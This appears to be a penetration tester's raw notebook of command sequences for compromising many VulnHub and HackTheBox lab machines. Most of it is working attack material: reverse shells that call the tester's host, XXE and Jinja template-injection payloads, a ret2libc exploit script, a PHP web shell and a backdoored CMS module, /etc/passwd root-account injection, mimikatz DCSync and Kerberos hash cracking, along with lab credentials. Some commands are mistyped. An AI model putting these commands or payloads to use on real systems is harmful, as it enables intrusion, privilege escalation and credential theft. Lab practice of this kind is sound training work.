ldapsearch -h 10.1.1.27 -p 389 -b "dc=symfonos,dc=local" -w 'qMDdyZh3cT6eeAWD' -D "cn=admin,dc=symfonos,dc=local"
	##got credentials
	userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
	mail: zeus@symfonos.local
	gecos: Zeus User
ssh zeus@10.1.1.27
sudo -l
		##abuse dpkg
		##create debian pakage
nano 5shell.sh
	#!/bin/bash
	/bin/bash
apt-get install ruby ruby-dev rubygems build-essential
man gem
gem install fpm
gem2.8 --version
gem2.8 install fpm
fpm -s dir -t deb -n exploit –before-install 5hell.sh .
python -m SimpleHTTPServer 8888
wget http://10.1.1.5:8888/exploit_1.0_amd64.deb
sudo -u root dpkg -i exploit_1.0_amd64.deb
cat proof.txt



Me and My Girlfriend: 1
====================================
nmap -sC -sV -A -p- 10.1.1.28 -o nmap
http://10.1.1.28
	##add request from burp
	X-Forwarded-For: localhost
http://10.1.1.28?page=register
http://10.1.1.28?page=login
http://10.1.1.28?page=profile&user_id=12
http://10.1.1.28?page=progile&user_id=5
	##url injection and got credentials
	alice:4lic3
	eweuhtandingan:skuytuh
	sundatea:indONEsia
	sedihangmah:cedihhihihi
ssh alice@10.1.1.28
sudo -l
		##php priveledge escalation
sudo /usr/bin/php -r '$sock=fsockopen("10.1.1.5",4343);exec("/bin/sh -i <&3 >&3 2>&3");'
wget http://10.1.1.5:8888/shell.php
sudo php shell.php
nv -lvp 3434
echo "rooot:`openssl passwd -1 -salt ignite pass123`:0:0:root:/root:/bin/bash


Serial: 1
==================================
nmap -sC -sV -A -p- 10.1.1.30 -o nmap
dirb http://10.1.1.30
	##decode cookie with base64
curl -v http://10.1.1.30/bakcup/
	##unzip file
php user.class.php
cat user.class.php
	##log.class.php didnt call at all
	##edit user.class.php and call log.class.php
	##add echo base64_encode(serialize(new User('admin')));
php user.class.php
python -m SimpleHTTPServer 8888
	##include our file shell.php
http://10.1.1.30/index.php?c=ls+/
http://10.1.1.30/index.php?c=cat+/credentials.txt.bak
	##got credentials sk4:KywZmnPWW6tTbW5w
ssh sk4@10.1.1.30
sudo -l
sudo vim -c ':!/bin/sh'
	##vim privsc
	##https://gtfobins.github.io
	



Serial: 2
==================================
nmap -sS -sV -T4 -A -p- 10.1.1.31
dirb http://10.1.1.31
	##download serial2.apk
http://10.1.1.31/api
apktool d serial2.apk
grep -ir basic_auth apkserial2/*
	##add to header API request "Authorization: Basic c2s00mgiaueiijnbij9TEE"
http://10.1.1.31/nmap?ip=127.0.0.1 | ls -laht
http://10.1.1.31/nmap?ip=127.0.0.1 | which bash nc sh
http://10.1.1.31/nmap?ip=127.0.0.1 | nc 10.1.1.5 4343 -e /bin/bash
nc -lvp 4343
which git
tar -zcvf /serial2/public/serial2.tar.gz /serial2
cat serial2.tar.gz | nc 10.1.1.5 4321
nc -lvp 4321 > serial2.tar.gz
wget http://10.1.1.31/serial2.tar.gz
tar -xzvf serial2.tar.gz
cd serial2
git log
git checkout b0398adn9173hiudsahf9h193hijasd67c3
chmod 600 id_rsa
ssh -i id_rsa sk4@10.1.1.31
id
python linuxprivchecker.py > report.txt
find / -perm -u=s -type f 2>/dev/null
find / -writable -type f 2>/dev/null >/tmp/report.txt
grep -Ev '/proc|/sys|app' /tmp/report.txt
uname -a
find / -name backd00r 2>/dev/null
cat /bin/backd00r | nc 10.1.1.5 4321
nc -lvp 4321 > backd00r
file backd00r
strings backd00r
	##find credz "j&9GCS34MY+^4ud*"
cat /proc/sys/kernel/randomize_va_space
cat /lib/x86_64-linux-gnu/libc.so.6 | nc 10.1.1.5 4321
nc -lvp 4321
gdb backd00r
>checksec
>run
> ## input "admin" & ctrl+c to find the memory location
>b *login+184
>run
> ##login with credz
>python -c 'print "A"*72+"B"*6'
>pattern_create 200
>c
> ##input python pattern
>exit
	##offside at 72
	##exploit https://raw.githubusercontent.com/andersongomes001/vulnhub/master/serial2/xpl.py


Scarecrow
===================================
dirb http://10.1.1.32 /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
http://10.1.1.32/scarecrow/
http://10.1.1.32/scarecrow/login.php
	##XXE Injection
	//<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///etc/passwd'>]><root><user>%26test%3b</user></root>
auth=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'php://filter/convert.base64-encode/resource=/var/www/html/scarecrow/personal_secret_admin_page.php'>]><root><user>%26test%3b</user></root>
auth=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'php://filter/convert.base64-encode/resource=/var/www/html/scarecrow/login.php'>]><root><user>%26test%3b</user></root>
	##OS command injection ping ip escape with "%0a" = "%250A"
auth=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE creds [ <!ELEMENT creds ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/scarecrow/personal_secret_admin_page.php?ip=10.1.1.32%250Als' >]><creds><user>%26xxe;</user><pass>pass</pass></creds>
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.1.1.5 LPORT=4343 -f raw -o shell.php
python -m SimpleHTTPServer 8000
auth=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE creds [ <!ELEMENT creds ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/scarecrow/personal_secret_admin_page.php?ip=192.168.56.118%250Awget%2520http%253A%252F%252F10.1.1.5%253A8000%252Fshell.php' >]><creds><user>%26xxe;</user><pass>pass</pass></creds>
use exploit/multi/handler 
set LHOST 10.1.1.5
set LPORT 4343
set PAYLOAD php/meterpreter/reverse_tcp 
exploit
nc -lvp 4343
stty raw -echo
fg
reset
binwalk -e personal_backup.jpg
zip2john personal_backup.jpg > hash.txt
john --wordlist=/home/rockyou.txt hast.txt
	##got credz #beautifull_root1999!
ssh paw-sk4@10.1.1.32
cat backup.py
cd /var/www/paw-sk4-experiments/
touch ./'"";$(chmod 4755 $(which find))'
find . -exec /bin/sh -p \; -quit
	##file will execute something like this
	##cp "/var/www/paw-sk4-experiments/"";$(touch haha)'" /tmp/




Jigsaw
===================================
nmap -sV -A 10.1.1.33
	##filter with wireshark and find udp packet
echo "j19s4w" | nc -u IP 666
apt-get install knockd
knock 10.1.1.33 5500 6600 7700
http://10.1.1.33
wget http://10.1.1.33/jigsaw.gif
strings jigsaw.gif
http://10.1.1.33/w4n770p14y494m3/
	##vulnerable to XXE
	//<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><email>&xxe;</email><password></password></root>
	//<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/knockd.conf" >]><root><email>&xxe;</email><password></password></root>
knock 10.1.1.33 7011 8011 9011
ssh jigsaw@10.1.1.33
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
/bin/game3
ldd /bin/game3 | grep libc					##check ALSA
cat /proc/sys/kernel/randomize_va_space		##check ASLR
echo 0 > /proc/sys/kernel/randomize_va_space	##disable but need root https://docs.oracle.com/html/E36387_03/ol_kernel_sec.html
scp jigsaw@10.1.1.33:/bin/game3 .
gdb game3
	##ret to libc https://spz.io/2018/10/18/buffer-overflow-return-to-libc/
ldd /bin/game3													##libc base address
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system			##libc system address
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit			##libc exit address
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh	##libc bin sh address
exploit script:
===============
from subprocess import call
import struct

libc_addr = 0xb752e000
sys_addr = struct.pack("<I", libc_addr+0x00040310)
sh_addr = struct.pack("<I", libc_addr+0x00162d4c)
exit_addr = struct.pack("<I", libc_addr+0x00033260)

buf = "A"*76
buf += sys_addr
buf += exit_addr
buf += sh_addr

i = 0
while(i<512):
    print("Try: %s" % (i))
    print(buf)
    i += 1
    ret = call(["/bin/game3", buf])
===============
python exp.py
echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd




Cynix: Cyber Phoenix
====================================
nmap -sC -sV -A -p- 10.1.1.38 -o nmap
dirb http://10.1.1.38
wfuzz -c -w /usr/wordlists/dir-medium.txt -hc 404 http://10.1.1.38/FUZZ
dirb http://10.1.1.38/lavalamp/
	##submit form and directed to canyoubypassme.php
curl http://10.1.1.38/lavalamp/canyoubypassme.php
	##inspect element and change opacity to 0.5
	##submit 1../../../../etc/passwd
curl http://10.1.1.38/lavalamp/canyoubypassme.php?file=1../../../etc/passwd&read=Download+the+number
curl http://10.1.1.38/lavalamp/canyoubypassme.php?file=1../../../home/ford/.ssh/id_rsa&read=Download+the+number
echo > id_rsa_ford
echmod 600 id_rsa_ford
ssh ford@10.1.1.38 -p 6688 -i id_rsa_ford
id
groups
	##LXD priviledge excalation
	##download repo in local
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python -m SimpleHTTPServer 8888
	##upload to target and install
wget http://10.1.1.38/alphine.tar.gz
lxc image import ./apline.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
mnt/root/root
	##now we can mount every file in system as root
ls





Sniper HTB
===================================
nmap -sC -sV -o nmap 10.10.10.151
smbclient -L \\10.10.10.151
http://10.10.10.151
http://10.10.10.151
gobuster dir -w /yusr/share/wordlist/dirbuster/dir-2.small.txt -t 5 -x php -u http://10.10.10.151/blog/ -o diruser.txt
http://10.10.10.151/blog/?lang=blog-es.php
http://10.10.10.151/blog/?lang=css/style.css
http://10.10.10.151/blog/?lang=php://filter/convert.base64-encode/resource=index.php
nc -lvp 445
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\asd.asd
impacket-smbserver -smb3support htb /home/sniperhtb/
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\nmap
nano /etc/samba/smb.conf
	[htb]
		comment = entot
		path = /home/sniperhtb/
		guest ok = yes
		browseable = yes
		create mask = 0600
		writeable = yes
systemctl start smbd
smbclient -L ##10.10.4.74/htb/
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\nmap
echo '<?php system($_REQUEST("asd"));?>' > 5hell.php
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\5hell.php?asd=systeminfo
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\dxnboy.php
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\nc.exe
nc.exe 10.10.4.74 4343 -e powershell
rlwarp nc -lvp 4343
Get-WmiObject -Class Win32_UserAccount
cd C:\inetpub\wwwroot\
gci -recurse | select Fullname
gc db.php
net user Chris
crackmapexec smb 10.10.10.151 -u Chris -p '36mEAhz/B8xQ~2VM'
$user = 'SNIPER\Chris'
$pass = '36mEAhz/B8xQ~2VM'
$secpass = ConvertTo-SecureString $pass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $secpass)
$cred
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock {whoami}
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock {//10.10.4.74/htb/nc.exe 10.10.4.74 4321 -e powershell}
rlwrap nc -lvp 4321
netstat -an
cd C:\Users\Chris
gci -recurse | select Fullname
chmod 777 /home/sniperhtb/
copy instruction.chm ##10.10.4.74\htb\
file instruction.chm
	##download it to windows machine and start wordking with windows
	wget instruction.chm .
	wget nishang/Client/Out-CHM.ps1
	PS C:\Users\prashant\Desktop>certutil -urlcache -split -f https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1
	import-module .\out.chm.ps1;out-chm -Payload "C:\Users\Chris\Download\nc.exe -e powershell 10.10.4.74 4141" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
	copy doc.chm ##10.1.1.5\htb\
cd C:\docs
echo asd > asd.chm
echo asd > asd.txt
dir				##asd.chm got excuted by big boss
copy ##10.10.4.74\htb\doc.chm .
rlwrap nc -lvp 4141



Resolute HTB
===================================
nmap -sC -sV -A -p- 10.10.10.169 -o nmap
enum4linux 10.10.10.169
	##got creds
	##some active user and credz Welcome123!
	##try login bruteforce via smb with metasploit
msfconsole
use auxiliary/scanner/smb/smb_login
>set RHOST 10.10.10.169
>set USER_FILE users.txt
>set smbpass Welcome123!
>set smbdomain MEGABANK
>run
	##got creds
	##MEGBANK\melanie:Welcome123!
ldapdomaindump -u MEGABANK##melanie -p Welcome123! 10.10.10.169
file:////home/resolutehtb/ldapenum/domain_users.html
evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
net user melanie /domain
cd c:
Get-ChildItem -Force
cd PSTranscripts
Get-ChildItem -Force
cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
	##got creds
	##ryan:Serv3r4Admin4cc123!
evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
[Environment]::Is64BitOperatingSystem
net user ryan /domain
	##domain priv excalation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
msfvenom -p windows/x64/exec cmd='net group "domain admins" melanie /add /domain' --platform windows -f dll > /home/kali/dns.dll
dnscmd RESOLUTE /config /serverlevelplugindll ##10.10.14.156\htb\dnsku.dll
sc.exe ##RESOLUTE stop dns
sc.exe ##RESOLUTE start dns
evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
whoami /all



Tempus Fugit 3
=======================================================
nmap -sC -sV -A -p- 10.10.10.29 -o nmap
10.1.1.29/${7*7}
10.1.1.29/{{7*7}}
10.1.1.29/{{7*'7'}}			##vulnerable Server Site Template Injection (SSTI) with Jinja template
							##abuse Jinja SSTI: https://github.com/vulhub/vulhub/tree/master/flask/ssti
http://10.1.1.29/%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
nc -lvp 4343
							##reverse shell encode it with url burp
http://10.1.1.29/{{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i >& /dev/tcp/10.1.1.5/4343 0>&1'",shell=True,stdout=-1).communicate()[0].strip()}}
stty raw -echo
fg
reset
python -c 'import pty;pty.spawn("/bin/bash")'
cat /srv/flask_app/app.py
which sqlcipher
sqlcipher static/db2.db --interactive
>pragma key='SecretssecretsSecrets...'
>.tables
>select * from users;
		##got credz
		hugh-janus|S0secretPassW0rd
		anita-hanjaab|ssdf%dg5xc
		clee-torres|asRtesa#2s
		RmxhZzN7IEhleSwgcmVhZGluZyBzZWNyZXRzICB9|
for i in {1..254} ;do (ping -c 1 192.168.100.$i | grep "bytes from" &) ;done
which git
cd /tmp
git clone https://github.com/In2econd/portscanner
python portscanner/portscanner.py 192.168.100.100 1 65535
		##got open port 80 and 45844
ssh -N -R 5555:192.168.100.1:443 root@10.1.1.5
http://127.0.0.1:5555
http://127.0.0.1:5555/processwire
		##login with this credentials admin:S0secretPassW0rd
git clone https://github.com/EnableSecurity/wafw00f
wafw00f/wafw00f -a http://127.0.0.1:5555/proceswire/page/edit/\?id\=21\c=whoami
http://127.0.0.1:5555/processwire/module
		##download module from https://modules.processwire.com/modules/helloworld/ then edit to put a backdoor and upload
unzip HelloWorld.zip
nano helloworld.module.php
		$this->addHookBefore('ProcessPageEdit::execute', function($event) {
			$page = $event->object->getPage(); ## getPage() is a method in ProcessPageEdit
			if($page->id == 1) {
				## user is editing the homepage
				$event->message("Hello {$event->user->name} - You are editing the homepage!");
			} else {
				system(base64decode($_GET['c']));
			}
			});
zip -r a.zip HelloWorld/
		##upload and install
http://127.0.0.1:5555/processwire/page/edit/?id=21&c=d2hvWYH1						##base64 encode from whoami
http://127.0.0.1:5555/processwire/page/edit/?id=21&c=m2JY28Bl8slo18LSJi8718n13b		##base64 encode from /bin/netcat -e /bin/sh 10.1.1.5 4114
nc -lvp 4114





Tempus Fugit 1
============================================
nmap -sC -sV -A -p- 10.1.1.40 -o nmap
http://10.1.1.40/upload
	##RCE with wildcard
	##decimal and hex ip address to bypass wildcard download script: https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py
	##intercept and make file asd.txt;nc 167859215 4343 -e sh
nc -lvp 4343
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
reset
cat main.py
		##got credz someuser:b232a4da4c104798be4613ab76d26efda1a04606
cd /root
cat .ncftp/trace.234
ifconfig
for i in {1..254} ;do (ping -c 1 172.19.0.$i | grep "bytes from" &) ;done
for i in $(seq 1 65535); do nc -nvz -w 1 172.19.0.12 $i 2>&1; done | grep -v "Connection refused"
which lftp
lftp someuser@172.19.0.12
>ls
>cat cmscreds.txt
		##got credz admin:hardEnough4u
>exit
for i in $(seq 1 65535); do nc -nvz -w 1 172.19.0.1 $i 2>&1; done | grep -v "Connection refused"
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.107 lport=4444 -f elf > shell.elf
python -m SimpleHTTPServer 8888
wget http://10.1.1.5:8888/shell.elf .
chmod +x shell.elf
./shell.elf
msfconsole
>use exploit/multi/handler
>set lport 4444
>set lhost 10.1.1.5
>show payloads
>set payload linux/x86/meterpreter/reverse_tcp
>run
netstat -lntp
kill 9				##kill port 80 to enable port forwarding
netstat -lntp
>portfwd add -l 6060 -p 8080 -r 172.19.0.1
cat /etc/resolv.conf
search mofo.pwn
apk list dig
apk add bind-tools
dig axfr mofo.pwn
				##got domain CNAME ourcms.mofo.pwn
				##and it into kali /etc/hosts 127.0.0.1	ourcms.mofo.pwn
http://ourcms.mofo.pwn:6060
http://ourcms.mofo.pwn:6060/admin
				##login with this credz admin:hardEnough4u
				##edit templat and add reverse shell
				//<?php exec('nc -e /bin/sh 10.1.1.5 4321'); ?>
nc -lvp 4321
find / -perm -4000 -type f 2>/dev/null
responder -I eth0
			##set responder from kali
			##got credz ireland:school
su ireland
ssh ireland@10.1.1.40
cd /var/mail
cat ireland
			##got credz benni:9y4lw0r82kl3
su benni
sudo -l
sudo lua -e 'os.execute("/bin/sh")'
sudo cpulimit -l 100 -f /bin/sh







Tempus Fugit 2
=====================================
nmap -sC -sV -A -p- 10.1.1.41 -o nmap
wpscan -u http://10.1.1.41 -e u
		##set listener on wireshark
		##request reset password will trigger SMTP request
		##smtp.tempusfugit2.com  & smtp.tempusfugit2.com.localdomain
nano /etc/ettercap/etter.dns
		*.tempusfugit2.com      A       10.1.1.41
		*.tempusfugit2.com.localdomain      A       10.1.1.41
python -m smtpd -n -c DebuggingServer 10.1.1.41:25
>open ettercup
>unified sniffing
>scan host
>select host add to target
>MITM >arp sppofing >sniff remote connection
>manage plugin >dns spoof
		##forgot password and email request will spoffed to our kali python mail server
		##follow the link and login
		##reverse shell
nc -lvp 4343
cat nb.txt
		##got credz sada:9s4lw0r82cs5
knock 1981 867 5309
nmap -p- 10.1.1.41
ssh sada@9s41w0r82cs5
sudo -l
sudo -u migdalia timedatectl list-timezone
		##escape with !/bin/bash
hydra -l migdalia -P rockyou.txt ssh://10.1.1.41:22
		##got credz migdalia:manchester
ssh migdalia@10.1.1.41
sudo -l
cat list
sudo docker exec -it 1786dd63dedb bash
cd wp-content/TFDocument
		##create suid binary command
nano suid.c
	int main(void) {
       setgid(0); setuid(0);
       execl("/bin/sh","sh",0);
	}
gcc suid.c -o suid
python -m SimpleHTTPServer 8888
wget http://10.1.1.41/suid .
chmod 4755 suid
exit
ls -lah
./suid




InfoSec Prep: OSCP
=======================================
nmap -sC -sV -A -p- 10.1.1.53 -o nmap
dirb http://10.1.1.53
http://10.1.1.53/robots.txt
curl http://10.1.1.53/secret.txt | base64 -d > sshkey
chmod 600 shhkey
ssh oscp@10.1.1.53 -i sshkey
id
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python -m SimpleHTTPServer 8888
wget http;//10.1.1.5:8888/alphine.tar.gz . 
which lxd
which lxc
run /snap/bin/lxc
cd /snap/bin
./lxc image import alphine.tar.gz --alias myimage
./lxc init myimage ignite -c security.privileged=true
		##got error & need to init lxd
./lxd init
		##yes to all
./lxc init myimage ignite -c security.privileged=true
./lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
./lxc start ignite
./lxc exec ignite /bin/sh
id
cd /mnt/root/root
ls
cat flag.txt
		##d73b04b0e696b0945283defa3eee438
		##d73b04b0e696b0945283defa3eee4538





Election
=====================================
nmap -sC -sV -A -p- 10.1.1.54 -o nmap
dirb http://10.1.1.54
dirb http://10.1.1.54/election/ -X .php,.html,.txt,.log
http://10.1.1.54/election/card.php
		##decript binary to text
		 ##got credz 1234:Zxc1234#!
http://10.1.1.54/election/admin
http://10.1.1.54/election/system.log
		##got credz love:P@ssw0rd@123
ssh love@10.1.1.54
sudo -l
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
searchsploit serv-u
		##search on google serv-u priviledge escalation and compile
gcc exp.c -o exp
./exp
id
cat /root/root.txt





Cascade HTB
====================================
nmap -p- --min-rate 10000 10.10.10.182 -o nmap 
nmap -sC -sV -A -p `cat nmap | grep open | cut -d "/" -f1 | tr "\n" ","` 10.10.10.182 -o service.nmap
smbclient -N -L //10.10.10.182
smbmap -H 10.10.10.182
rpcclient -U '' -N 10.10.10.182
>?
>enumdomusers
		##got list of users
>exit
ldapsearch -h 10.10.10.182 -x -s base namingcontexts
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous.txt
ldapsearch -h 10.10.10.182 -x -b 'dc=cascade,dc=local'  "(objectclass=*)" > ldap-object.txt
cat ldap-* | grep -i password,pass,pwd,cascadeLegacyPwd
		##got r.thompson passwd
cat thompsonpwd.txt | base64 -d
smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
mkdir smbdump-thompson && cd smbdump-thompson
smbclient -U r.thompson //10.10.10.182/Data rY4n5eva
>mask ""
>recurse ON
>prompt OFF
>mget *
>exit
find type -f
cat IT/Email Archives/Meeting_Notes_June_2018.html
cat IT/Temp/s.smith/VNC Install.reg
		##get passwd hex VNC 6b,cf,2a,4b,6e,5a,ca,0f
git clone https://github.com/trinitronx/vncpasswd.py
vncpasswd.py -d -H 6bcf2a4b6e5aca0f
		##got credz s.smith
evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
>[environment]::OSVersion.Version
>net user s.smith
>net localgroup "Audit Share"
smbmap -H 10.10.10.182 -U s.smith -p sT333ve2
mkdir smbdump-smith && cd smbdump-smith
smbclient -U s.smith //10.10.10.182/Audit$ sT333ve2
>mask ""
>recurse ON
>prompt OFF
>mget *
>exit
find type -f
file Audit.db
sqlite3 Audit.db
>.tables
>select * from DeletedUserAudit;
>select * from Ldap;
cat RunAudit.bat
file CascAudit.exe
		##decompile CascAudit.exe
		##got credz arksvc:w3lc0meFr31nd
decrypt from here: https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09
evil-winrm -u arksvc -p "w3lc0meFr31nd" -i 10.10.10.182
>net user arksvc
>Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects" -and samaccountname -eq "TempAdmin"' -includeDeletedObjects -property *
		##recover deleted account "TempAdmin"
		##credz base64 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz
nano passwdadmin.txt | base64 -d
		##recovered and got credz administrator:baCT3r1aN00dles
evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles






Sauna HTB
====================================
pport=$(nmap -Pn -p- --min-rate=10000 -T4 10.10.10.175 | grep ^[0-9] | cut -d "/" -f1 | tr "\n" "," | sed s/,$//); nmap -sC -sV -A -p $pport 10.10.10.175 -o nmap
ldapsearch -h 10.10.10.175 -x -s base namingcontexts
ldapsearch -h 10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL" > ldap-anonymous.txt
ldapsearch -h 10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL" 'objectClass=*'> ldap-objectclass.txt
rpcclient -U "" 10.10.10.175
> enumdomusers
> querydominfo
		\rpc can login anonymous but dennied query
ls /usr/share/doc/python3-impacket/examples
cp /usr/share/doc/python3-impacket/examples/GetADUsers.py .
./GetADUsers.py -all -no-pass -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/
less /usr/share/doc/python3-impacket/examples/GetNPUsers.py
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt -dc-ip 10.10.10.175
		##got credz kerebros hash ssmith
hashcat -h | grep -i kerberos
hashcat -m 18200 kerberos-fsmith-hash.txt /home/rockyou.txt -o pass.txt
		##got credz fsmith:Thestrokes23
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
>type ../Desktop/user.txt
		##download winpeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases
python -m SimpleHTTPServer 8888
>invoke-webrequest -url http://10.10.14.65:8888/WinPEASany.exe -outfile winpeas.exe
>./winpeas.exe
		##got credz svc_loanmanager:Moneymakestheworldgoround!
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
		##dowload mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200715/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
cd Win32
python -m SimpleHTTPServer 8888
>invoke-webrequest -url http://10.10.14.65:8888/mimikatz.exe -outfile mimikatz.exe
.\mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
		##got credz administrator hash 
evil-winrm -i 10.10.10.175 -H d9485863c1e9e05851aa40cbb4ab9dff -u Administrator
		##another dump with impacket secretdump
ls /usr/share/doc/python3-impacket/examples
secretdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
		##got credz administrator hash




Remote HTB
====================================
pport=$(nmap -Pn -p- --min-rate=10000 -T4 10.10.10.180 | grep ^[0-9] | cut -d "/" -f1 | tr "\n" "," | sed s/,$//); nmap -sC -sV -A -p $pport 10.10.10.180 -o nmap
dirb http://10.10.10.180/ -x .php,.html,.txt,.log
showmount -e 10.10.10.180
		##from mount port 2049 got mount directory site_backups
mount 10.10.10.180:/site_backups site_backups/
umount site_backups
ls site_backups/
strings site_backups/App_Data/Umbraco.sdf | grep admin
		##got umbraco creds SHA1
john hash-umbraco.txt --format=Raw-SHA1 --wordlist=/home/rockyou.txt
		##got credz admin@htb.local:baconandcheese
searchsploit umbraco
searchsploit -m 46153
		##another umbraco RCE: https://github.com/noraj/Umbraco-RCE/blob/master/exploit.py
ls /usr/share/windows/binary/
cp /usr/share/windows/binary/nc.exe .
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'ls c:/'
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'c:/windows/temp/nc.exe 10.10.14.78 4343 -e cmd.exe'
nc -lvp 4343
>whoami
>type c:/Users/Public/user.txt
>certutil -urlcache -split -f http://10.10.14.78:8888/winPEASany.exe c:/windows/temp/winpeas.exe
>winpeas.exe
		##got two privilege escalation method
>whoami /priv
>wmic service where started=true get name, startname
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.78 LPORT=4141 -f exe > exp.exe
>certutil -urlcache -split -f http://10.10.14.78:8888/exp.exe c:/windows/temp/exp.exe
>sc config usosvc binpath="c:\windows\temp\exp.exe"
>sc stop usosvc
nc -lvp 4141
>sc start usosvc
>type C:\Users\Administrator\Desktop\root.txt
		##another technique with meterpreter
msfconsole
>use exploit/multi/handler
>show payloads
>set payload windows/meterpreter/reverse_tcp
>set lhost 10.10.14.78
>set lport 4141
>exploit
>exp.exe
>shell
>exit
>run post/windows/gather/credentials/teamviewer_passwords
		##got TM7 credz REMOTE:!R3m0te!





Fuse HTB
===================================
nmap -Pn -p- --min-rate=10000 -T4 10.10.10.180 | grep ^[0-9] | cut -d "/" -f1 | tr "\n" "," | sed s/,$//
http://10.10.10.193
http://fuse.fabricorp.local/papercut/logs/html/index.htm
		//got user pmerton, tlavel, sthompson, bhult
git clone https://github.com/digininja/CeWL
cewl.rb -d 5 -m 3 -w pass.lst  http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
msfconsole
>use auxiliary/scanner/smb/smb_login
>set rhost 10.10.10.180
>set user_file user.txt
>set pass_file pass.txt
>exploit
		##got credz tlavel:Fabricorp01
smbclient -L 10.10.10.180 -U tlavel
smbpasswd -r 10.10.10.180 -U tlavel
rpcclient -L 10.10.10.180 -U tlavel
